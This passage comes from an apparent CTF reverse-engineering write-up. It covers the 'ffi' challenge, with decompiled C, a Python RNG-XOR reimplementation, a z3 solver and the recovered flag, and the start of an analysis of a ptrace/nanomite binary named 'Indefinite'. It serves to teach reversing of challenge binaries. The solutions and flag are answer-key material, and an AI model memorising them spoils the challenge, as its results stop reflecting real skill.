</span></span><span class="line"><span class="cl">    <span class="n">method_seed</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="nf">PyObject_GetAttrString</span><span class="p">(</span><span class="n">randomMod</span><span class="p">,</span><span class="s">&#34;seed&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">seed</span> <span class="o">=</span> <span class="nf">PyLong_FromLong</span><span class="p">((</span><span class="kt">long</span><span class="p">)</span><span class="n">seed_value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">seed_tuple</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="nf">PyTuple_New</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">PyTuple_SetItem</span><span class="p">(</span><span class="n">seed_tuple</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">seed</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">PyObject_CallObject</span><span class="p">(</span><span class="n">method_seed</span><span class="p">,</span><span class="n">seed_tuple</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_Py_DECREF</span><span class="p">(</span><span class="n">seed_tuple</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_Py_DECREF</span><span class="p">(</span><span class="n">method_seed</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>The value of <code>secret</code> is no secret:</p>
<pre tabindex="0"><code>                         secret                                                       XREF[2]:   python_check:00267dd3(*), python_check:00267dda(R)
      0034b8b0 22 af 2d 26 3b           undefined5           002DAF223Bh
</code></pre><p>To know which python method is called in the main loop, we need to look at the <code>GenDef</code> address.</p>
<p>The <code>PyCMethod_New</code> first argument must be a <a href="https://docs.python.org/3/c-api/structures.html#c.PyMethodDef">PyMethodDef</a>. (<em>see methodobject.h</em>)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">PyMethodDef</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="kt">char</span>  <span class="o">*</span><span class="n">ml_name</span><span class="p">;</span>   <span class="cm">/* The name of the built-in function/method */</span>
</span></span><span class="line"><span class="cl">    <span class="n">PyCFunction</span> <span class="n">ml_meth</span><span class="p">;</span>    <span class="cm">/* The C function that implements it */</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span>         <span class="n">ml_flags</span><span class="p">;</span>   <span class="cm">/* Combination of METH_xxx flags, which mostly
</span></span></span><span class="line"><span class="cl"><span class="cm">                               describe the args expected by the C func */</span>
</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="kt">char</span>  <span class="o">*</span><span class="n">ml_doc</span><span class="p">;</span>    <span class="cm">/* The __doc__ attribute, or NULL */</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">PyMethodDef</span> <span class="n">PyMethodDef</span><span class="p">;</span>
</span></span></code></pre></div><p>so if we quickly cast 4 pointers in place of &ldquo;GenDef&rdquo; we get:</p>
<pre tabindex="0"><code>                         GenDef                                                       XREF[1]:   python_check:00267d84(*)
      0034b8c0 24 f6 29 00 00 00 00     addr                 s_rand_stream_0029f624                                                                   = &#34;rand_stream&#34;
               00
      0034b8c8 c0 7c 26 00 00 00 00     addr                 GetNum
               00
      0034b8d0 80 00 00 00 00 00 00     addr                 DAT_00000080
               00
      0034b8d8 00 00 00 00 00 00 00     addr                 00000000
               00
</code></pre><p>and the <code>GetNum</code> function, which calls the python <code>random.randrange(0x100)</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">long</span> <span class="o">*</span> <span class="nf">GetNum</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">long</span> <span class="o">*</span><span class="n">randrange</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">long</span> <span class="o">*</span><span class="n">value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">long</span> <span class="o">*</span><span class="n">not_so_random_value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">randrange</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="nf">PyObject_GetAttrString</span><span class="p">(</span><span class="n">randomMod</span><span class="p">,</span><span class="s">&#34;randrange&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">value</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="nf">PyLong_FromLong</span><span class="p">(</span><span class="mh">0x100</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">not_so_random_value</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="nf">PyObject_CallOneArg</span><span class="p">((</span><span class="kt">long</span><span class="p">)</span><span class="n">randrange</span><span class="p">,(</span><span class="kt">long</span><span class="p">)</span><span class="n">value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_Py_DECREF</span><span class="p">(</span><span class="n">randrange</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_Py_DECREF</span><span class="p">(</span><span class="n">value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_Py_INCREF</span><span class="p">(</span><span class="n">not_so_random_value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">not_so_random_value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>The seed sets the initial state of the RNG, so same seed means same output.</p>
<p>We can easily reimplement it in python:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="mh">0x7a69</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">secret</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x22</span><span class="p">,</span> <span class="mh">0xaf</span><span class="p">,</span> <span class="mh">0x2d</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0x3b</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="n">secret</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">v</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randrange</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">s</span> <span class="o">^</span> <span class="n">v</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></span></code></pre></div><pre tabindex="0"><code>% python pyt_check.py
u51Ng
</code></pre><h2 id="74-java_check">7.4 java_check</h2>
<p>Whenever you have to deal with JNI, start by loading the proper jni.h header (you can get one which works for ghidra: <a href="https://github.com/extremecoders-re/ghidra-jni">https://github.com/extremecoders-re/ghidra-jni</a>).</p>
<p>then you can cast the JNIEnv and JavaVM, and everything becomes clear :)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl">    <span class="n">java_vm</span> <span class="o">=</span> <span class="nf">JNI_CreateJavaVM</span><span class="p">(</span><span class="o">&amp;</span><span class="n">jvm</span><span class="p">,</span><span class="o">&amp;</span><span class="n">env</span><span class="p">,</span><span class="o">&amp;</span><span class="n">vm_args</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">java_vm</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">class_Checker</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="o">*</span><span class="n">env</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">DefineClass</span><span class="p">)(</span><span class="n">env</span><span class="p">,</span><span class="s">&#34;Checker&#34;</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,(</span><span class="n">jbyte</span> <span class="o">*</span><span class="p">)</span><span class="n">Class</span><span class="p">,</span><span class="mh">0x752</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="o">*</span><span class="n">env</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">ExceptionDescribe</span><span class="p">)(</span><span class="n">env</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">class_Checker</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Failed to find Checker class&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">bVar3</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">met_hello_java</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="o">*</span><span class="n">env</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">GetStaticMethodID</span><span class="p">)(</span><span class="n">env</span><span class="p">,</span><span class="n">class_Checker</span><span class="p">,</span><span class="s">&#34;hello_java&#34;</span><span class="p">,</span><span class="s">&#34;(Ljava/lang/String;)Z&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">met_hello_java</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Failed to find main function&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">bVar3</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">str_flag</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="o">*</span><span class="n">env</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">NewStringUTF</span><span class="p">)(</span><span class="n">env</span><span class="p">,</span><span class="n">flag_part</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">jVar1</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="o">*</span><span class="n">env</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">CallStaticBooleanMethod</span><span class="p">)(</span><span class="n">env</span><span class="p">,</span><span class="n">class_Checker</span><span class="p">,</span><span class="n">met_hello_java</span><span class="p">,</span><span class="n">str_flag</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">bVar3</span> <span class="o">=</span> <span class="n">jVar1</span> <span class="o">!=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="nf">free</span><span class="p">(</span><span class="n">flag_part</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></div><ul>
<li>it starts by loading a <code>Checker</code>class from a 0x752 bytes binary blob <code>Class</code></li>
<li>finds the <code>Class.hello_java</code> method which takes a single String argument</li>
<li>creates a java String object from the flag</li>
<li>calls Checker.hello_java(flag)</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="n">class_Checker</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="o">*</span><span class="n">env</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">DefineClass</span><span class="p">)(</span><span class="n">env</span><span class="p">,</span><span class="s">&#34;Checker&#34;</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,(</span><span class="n">jbyte</span> <span class="o">*</span><span class="p">)</span><span class="n">Class</span><span class="p">,</span><span class="mh">0x752</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="n">met_hello_java</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="o">*</span><span class="n">env</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">GetStaticMethodID</span><span class="p">)(</span><span class="n">env</span><span class="p">,</span><span class="n">class_Checker</span><span class="p">,</span><span class="s">&#34;hello_java&#34;</span><span class="p">,</span><span class="s">&#34;(Ljava/lang/String;)Z&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="n">str_flag</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="o">*</span><span class="n">env</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">NewStringUTF</span><span class="p">)(</span><span class="n">env</span><span class="p">,</span><span class="n">flag_part</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="o">*</span><span class="n">env</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">CallStaticBooleanMethod</span><span class="p">)(</span><span class="n">env</span><span class="p">,</span><span class="n">class_Checker</span><span class="p">,</span><span class="n">met_hello_java</span><span class="p">,</span><span class="n">str_flag</span><span class="p">);</span>
</span></span></code></pre></div><p>Notice the java magic string <code>cafebabe</code>, it&rsquo;s a class file.</p>
<pre tabindex="0"><code>                         Class                                                        XREF[2]:   Entry Point(*), java_check:00267f6f(*)
      0029f722 ca fe ba be 00 00 00     db[1874]
               37 00 61 0a 00 0b 00
               1d 0a 00 1e 00 1f 0
         0029f722 [0]           CAh, FEh, BAh, BEh
         0029f726 [4]            0h,  0h,  0h, 37h
         0029f72a [8]            0h, 61h,  Ah,  0h
         0029f72e [12]           Bh,  0h, 1Dh,  Ah
</code></pre><p>export the <code>Class</code> binary blob and safe it to a file, then use <a href="https://github.com/skylot/jadx">jadx</a> or so to decompile it:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.util.stream.IntStream</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/* renamed from: Checker */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* loaded from: java.class */</span>
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Checker</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">boolean</span> <span class="nf">hello_java</span><span class="o">(</span><span class="n">String</span> <span class="n">str</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">int</span><span class="o">[]</span> <span class="n">iArr</span> <span class="o">=</span> <span class="o">{</span><span class="n">219</span><span class="o">,</span> <span class="n">227</span><span class="o">,</span> <span class="n">209</span><span class="o">,</span> <span class="n">154</span><span class="o">,</span> <span class="n">104</span><span class="o">,</span> <span class="n">97</span><span class="o">,</span> <span class="n">158</span><span class="o">,</span> <span class="n">163</span><span class="o">};</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">IntStream</span><span class="o">.</span><span class="na">range</span><span class="o">(</span><span class="n">0</span><span class="o">,</span> <span class="n">str</span><span class="o">.</span><span class="na">length</span><span class="o">()</span> <span class="o">-</span> <span class="n">1</span><span class="o">).</span><span class="na">mapToObj</span><span class="o">(</span><span class="n">i</span> <span class="o">-&gt;</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="n">Integer</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">i</span><span class="o">),</span> <span class="n">Integer</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">str</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">i</span><span class="o">)),</span> <span class="n">Integer</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">str</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">i</span> <span class="o">+</span> <span class="n">1</span><span class="o">))};</span>
</span></span><span class="line"><span class="cl">        <span class="o">}).</span><span class="na">filter</span><span class="o">(</span><span class="n">objArr</span> <span class="o">-&gt;</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="o">((</span><span class="n">Integer</span><span class="o">)</span> <span class="n">objArr</span><span class="o">[</span><span class="n">1</span><span class="o">]).</span><span class="na">intValue</span><span class="o">()</span> <span class="o">+</span> <span class="o">((</span><span class="n">Integer</span><span class="o">)</span> <span class="n">objArr</span><span class="o">[</span><span class="n">2</span><span class="o">]).</span><span class="na">intValue</span><span class="o">()</span> <span class="o">==</span> <span class="n">iArr</span><span class="o">[((</span><span class="n">Integer</span><span class="o">)</span> <span class="n">objArr</span><span class="o">[</span><span class="n">0</span><span class="o">]).</span><span class="na">intValue</span><span class="o">()];</span>
</span></span><span class="line"><span class="cl">        <span class="o">}).</span><span class="na">count</span><span class="o">()</span> <span class="o">==</span> <span class="o">((</span><span class="kt">long</span><span class="o">)</span> <span class="o">(</span><span class="n">str</span><span class="o">.</span><span class="na">length</span><span class="o">()</span> <span class="o">-</span> <span class="n">1</span><span class="o">));</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></div><p>what it does is, if you input the string <code>ABC</code>, it build an array like</p>
<pre tabindex="0"><code>[
 [0, 0x41 /* A */, 0x42 /* B */]
 [1, 0x42 /* B */, 0x43 /* C */]
 [1, 0x43 /* C */, 0x44 /* D */]
]
</code></pre><p>and then check that:</p>
<pre tabindex="0"><code> 0x41 + 0x42 == iArr[0]
 0x42 + 0x43 == iArr[1]
 0x43 + 0x43 == iArr[2]
</code></pre><p>we can quickly reverse it:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">z3</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">iArr</span> <span class="o">=</span> <span class="p">[</span><span class="mi">219</span><span class="p">,</span> <span class="mi">227</span><span class="p">,</span> <span class="mi">209</span><span class="p">,</span> <span class="mi">154</span><span class="p">,</span> <span class="mi">104</span><span class="p">,</span> <span class="mi">97</span><span class="p">,</span> <span class="mi">158</span><span class="p">,</span> <span class="mi">163</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">LEN</span> <span class="o">=</span> <span class="mi">9</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">Solver</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">LEN</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">e</span> <span class="o">=</span> <span class="n">BitVec</span><span class="p">(</span><span class="s1">&#39;c</span><span class="si">%d</span><span class="s1">&#39;</span><span class="o">%</span><span class="n">c</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">flag</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">And</span><span class="p">(</span><span class="n">e</span> <span class="o">&gt;=</span> <span class="mi">33</span><span class="p">,</span> <span class="n">e</span> <span class="o">&lt;=</span> <span class="mi">122</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">LEN</span> <span class="o">-</span> <span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">flag</span><span class="p">[</span><span class="n">c</span><span class="p">]</span> <span class="o">+</span> <span class="n">flag</span><span class="p">[</span><span class="n">c</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="n">iArr</span><span class="p">[</span><span class="n">c</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">out</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="n">s</span><span class="o">.</span><span class="n">check</span><span class="p">()</span> <span class="o">==</span> <span class="n">sat</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">m</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">model</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">condition</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">out</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">flag</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">        <span class="n">c</span> <span class="o">=</span> <span class="n">m</span><span class="p">[</span><span class="n">flag</span><span class="p">[</span><span class="n">x</span><span class="p">]]</span><span class="o">.</span><span class="n">as_long</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">out</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">condition</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">flag</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">!=</span> <span class="nb">int</span><span class="p">(</span><span class="n">m</span><span class="p">[</span><span class="n">flag</span><span class="p">[</span><span class="n">x</span><span class="p">]]</span><span class="o">.</span><span class="n">as_long</span><span class="p">()))</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">Or</span><span class="p">(</span><span class="n">condition</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>
</span></span></code></pre></div><pre tabindex="0"><code>% python java_solver.py
irq`:.3k8
dwle53.p3
lot]=+6h;
kps^&lt;,5i:
jqr_;-4j9
func710n5       &lt;&lt; looking promising
gtob801m6
hspa9/2l7
nmv[?)8f=
pkxYA&#39;:d?
olwZ@(9e&gt;
evmd62/o4
mnu\&gt;*7g&lt;
byjg35,r1
rizWC%&lt;bA
cxkf44-q2
azih26+s0
qjyXB&amp;;c@
</code></pre><pre tabindex="0"><code>% ./ffi
HTB{g3tt1ng_fr34ky_u51Ng_func710n5}
Correct!
</code></pre><p><em>notes: the program would validate other inputs for the java part:</em></p>
<pre tabindex="0"><code>% ./ffi                                      
HTB{g3tt1ng_fr34ky_u51Ng_gtob801m6}
Correct!
</code></pre><p><em>and the go function is just bugged:</em></p>
<pre tabindex="0"><code>% ./ffi
HTB{sxxxxxx_fr34ky_u51Ng_hspa9/2l7}
Correct!
</code></pre><h1 id="8-indefinite">8. Indefinite</h1>
<p>Original files <a href="rev_indefinite.zip">here</a>.</p>
<p>I really liked this one because it implements nanomites, dont ask me why i like them&hellip; :)</p>
<p>We have a binary and an encrypted file that we need to decrypt.</p>
<p>It starts by forking:</p>
<ul>
<li>the child process will do the work</li>
<li>the parent process will attach to the child process and &ldquo;drive&rdquo; it</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span><span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">uint</span> <span class="n">pid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="cm">/* make text segment PROT_READ|PROT_WRITE|PROT_EXEC */</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mprotect</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x101000</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">,</span><span class="mi">7</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">pid</span> <span class="o">=</span> <span class="nf">fork</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">pid</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">ptrace</span><span class="p">(</span><span class="n">PTRACE_TRACEME</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">child</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">wait</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">ptrace</span><span class="p">(</span><span class="n">PTRACE_CONT</span><span class="p">,(</span><span class="n">ulong</span><span class="p">)</span><span class="n">pid</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">tracer</span><span class="p">(</span><span class="n">pid</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>The <code>child</code> function will read 8 bytes from /dev/urandom and encrypt the file passed as argv[1]</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl">    <span class="n">fd</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="s">&#34;/dev/urandom&#34;</span><span class="p">,</span><span class="s">&#34;r&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">fread</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buffer</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="n">fd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">fclose</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">do_encrypt_file</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">buffer</span><span class="p">);</span>
</span></span></code></pre></div><p>The <code>do_encrypt</code> function&hellip; will crash:</p>
<pre tabindex="0"><code>                         *******************************************************
                         *                                                     *
                         *  FUNCTION                                           *
                         *******************************************************
                         undefined do_encrypt_file()
           undefined       AL:1           &lt;RETURN&gt;
